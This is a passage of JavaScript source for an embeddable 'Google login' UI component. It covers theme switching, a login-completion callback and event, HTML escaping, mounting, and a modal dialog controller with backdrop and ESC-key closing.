      const isDark = theme === 'dark' || (theme === 'auto' && window.matchMedia('(prefers-color-scheme: dark)').matches);
      const container = this.element.querySelector('.google-login-container');
      if (container) {
        container.setAttribute('data-theme', isDark ? 'dark' : 'light');
        container.classList.toggle('dark-theme', isDark);
      }
    }

    completeLogin() {
      const result = {
        success: true,
        user: {
          email: this.userData.email,
          name: this.userData.name,
          avatar: this.userData.avatar,
          token: this.userData.token,
          provider: 'google'
        },
        timestamp: new Date().toISOString()
      };

      // Trigger callback
      if (typeof this.options.onSuccess === 'function') {
        this.options.onSuccess(result);
      }

      // Dispatch Custom DOM Event
      const event = new CustomEvent('google-login-success', {
        detail: result,
        bubbles: true
      });
      this.element.dispatchEvent(event);
    }

    escapeHtml(str) {
      return (str || '').replace(/[&<>"']/g, function (m) {
        return {
          '&': '&amp;',
          '<': '&lt;',
          '>': '&gt;',
          '"': '&quot;',
          "'": '&#039;'
        }[m];
      });
    }

    mount(container) {
      if (typeof container === 'string') {
        container = document.querySelector(container);
      }
      if (container) {
        container.innerHTML = '';
        container.appendChild(this.element);
      }
      return this;
    }
  }

  // --- Modal Dialog Controller ---
  const GoogleLoginModal = {
    activeInstance: null,
    overlayElement: null,

    open(options = {}) {
      this.close(); // Close any existing modal

      const mergedOptions = Object.assign({
        mode: 'modal',
        onCancel: () => this.close()
      }, options);

      const component = new GoogleLoginComponent(mergedOptions);
      this.activeInstance = component;

      // Wrap in modal overlay
      const overlay = document.createElement('div');
      overlay.className = 'google-login-modal-overlay';
      overlay.appendChild(component.element);

      // Close on backdrop click
      overlay.addEventListener('click', (e) => {
        if (e.target === overlay) {
          if (typeof mergedOptions.onCancel === 'function') {
            mergedOptions.onCancel();
          }
          this.close();
        }
      });

      // Close on ESC key
      this._escListener = (e) => {
        if (e.key === 'Escape') {
          if (typeof mergedOptions.onCancel === 'function') {
            mergedOptions.onCancel();
          }
          this.close();
        }
      };
      document.addEventListener('keydown', this._escListener);

      document.body.appendChild(overlay);
      this.overlayElement = overlay;

      // Animate open
      requestAnimationFrame(() => {
        overlay.classList.add('open');
      });

      // Chain onSuccess to auto close if desired
      const userOnSuccess = mergedOptions.onSuccess;
      component.options.onSuccess = (data) => {
        if (userOnSuccess) userOnSuccess(data);
        setTimeout(() => this.close(), 600);
      };

      return component;
    },

    close() {
      if (this.overlayElement) {
        this.overlayElement.classList.remove('open');
        document.removeEventListener('keydown', this._escListener);
        setTimeout(() => {
          if (this.overlayElement && this.overlayElement.parentNode) {
            this.overlayElement.parentNode.removeChild(this.overlayElement);
          }
          this.overlayElement = null;
          this.activeInstance = null;
        }, 260);
      }
    }
  };

  // --- Global Export ---
  global.GoogleLoginComponent = GoogleLoginComponent;
  global.GoogleLogin = {
    Component: GoogleLoginComponent,
    Modal: GoogleLoginModal,
    open: (opts) => GoogleLoginModal.open(opts),
    close: () => GoogleLoginModal.close(),
    embed: (target, opts) => {
      const comp = new GoogleLoginComponent(Object.assign({ mode: 'card' }, opts));
      return comp.mount(target);
    }
  };

})(typeof window !== 'undefined' ? window : this);
